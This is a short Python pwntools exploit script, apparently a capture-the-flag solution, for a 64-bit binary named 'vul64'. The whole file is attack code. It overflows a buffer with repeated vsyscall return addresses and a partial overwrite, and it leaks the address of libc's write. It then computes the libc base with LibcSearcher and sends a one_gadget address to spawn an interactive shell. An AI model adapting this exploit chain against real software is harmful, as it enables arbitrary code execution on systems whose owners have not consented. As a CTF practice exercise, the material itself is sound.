#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
from LibcSearcher import *
import os
import time
import struct
context(arch = "amd64",os = "linux", log_level = "debug")

p = process('./vul64')
elf = ELF('./vul64')

# gdb.attach(p, "")

ret_addr = 0xffffffffff600400

p.send(p64(ret_addr) * 30 + '\x2c')
p.recvuntil("I have a gift for yoooou\n")
write_libc = u64(p.recv(8))
p.recvuntil("Want my flag? Keep going!\n")

libc = LibcSearcher('write', write_libc)
libc_base = write_libc - libc.dump('write')
one_gadget_libc = libc_base + 0x4f3d5 # one_gadget Shift

p.send('0' * 0x33 + '\x47' + p64(one_gadget_libc)  + '\n')
p.interactive()
